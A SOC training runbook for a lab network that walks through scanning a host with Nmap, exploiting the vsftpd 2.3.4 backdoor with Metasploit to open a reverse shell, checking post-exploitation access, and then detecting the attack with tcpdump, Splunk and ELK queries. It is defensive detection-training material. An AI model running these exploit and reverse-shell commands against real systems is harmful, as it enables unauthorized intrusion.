# SOC Investigation Runbook (End-to-End Attack Chain)

## Scope and safety

- Use only in a dedicated lab network.
- Never run against production or unauthorized systems.

---

## Phase 1 — Reconnaissance and scanning (Nmap)

From Kali:

```bash
export TARGET_IP=192.168.56.110
nmap -sS -sV -O -Pn -T4 $TARGET_IP -oN artifacts/raw/nmap_scan.txt
```

Capture key evidence:
- Open ports/services
- Service versions
- OS fingerprint confidence

Suggested evidence record (`artifacts/processed/evidence.jsonl`):

```json
{"timestamp":"2026-01-15T10:00:05Z","phase":"scan","tool":"nmap","severity":"medium","confidence":"high","src_ip":"192.168.56.101","dst_ip":"192.168.56.110","evidence":"SYN scan identified 21/tcp ftp vsftpd 2.3.4, 22/tcp ssh, 80/tcp http","attack_technique":"T1046"}
```

---

## Phase 2 — Exploitation (Metasploit)

Start Metasploit and use a matching exploit module:

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $TARGET_IP
set RPORT 21
set LHOST 192.168.56.101
run
```

Optional scripted run:

```bash
msfconsole -r scripts/sample_attack_chain.rc | tee artifacts/raw/msf_console.log
```

Capture key evidence:
- Module name and target service
- Session creation event
- Reverse shell connection metadata

Evidence example:

```json
{"timestamp":"2026-01-15T10:05:18Z","phase":"exploit","tool":"metasploit","severity":"high","confidence":"high","src_ip":"192.168.56.101","dst_ip":"192.168.56.110","evidence":"Exploit module exploit/unix/ftp/vsftpd_234_backdoor succeeded; command shell session 1 opened","attack_technique":"T1190"}
```

---

## Phase 3 — Shell / post-exploitation validation

Inside session:

```bash
sessions -i 1
whoami
uname -a
ip addr
```

Capture key evidence:
- User/context of execution
- Hostname/kernel details
- Any attempted discovery actions

Evidence example:

```json
{"timestamp":"2026-01-15T10:06:02Z","phase":"shell","tool":"metasploit","severity":"high","confidence":"high","src_ip":"192.168.56.101","dst_ip":"192.168.56.110","evidence":"Interactive shell established; whoami returned root","attack_technique":"T1059"}
```

---

## Phase 4 — Network and SIEM detection evidence

### Wireshark/tcpdump capture

```bash
tcpdump -i eth0 host $TARGET_IP -w artifacts/raw/attack_traffic.pcap
```

Potential detections:
- Burst SYN behavior (recon)
- Suspicious FTP interaction and callback patterns

### Splunk (example SPL)

```spl
index=lab sourcetype=suricata OR sourcetype=syslog src_ip=192.168.56.101 dst_ip=192.168.56.110
| stats count min(_time) as first_seen max(_time) as last_seen values(signature) by src_ip dst_ip dest_port
```

### ELK (example KQL)

```text
source.ip:"192.168.56.101" and destination.ip:"192.168.56.110"
```

Evidence example (SIEM alert export):

```json
{"timestamp":"2026-01-15T10:05:20Z","phase":"detect","tool":"splunk","severity":"high","confidence":"medium","src_ip":"192.168.56.101","dst_ip":"192.168.56.110","evidence":"Correlation search flagged exploit-like FTP traffic followed by shell callback","attack_technique":"T1190"}
```

---

## Phase 5 — Build structured timeline

Generate timeline artifacts:

```bash
python3 scripts/build_timeline.py \
  --input artifacts/processed/evidence.jsonl \
  --json-out artifacts/processed/incident_timeline.json \
  --md-out artifacts/processed/incident_timeline.md
```

Use resulting Markdown timeline as SOC investigation report appendix.
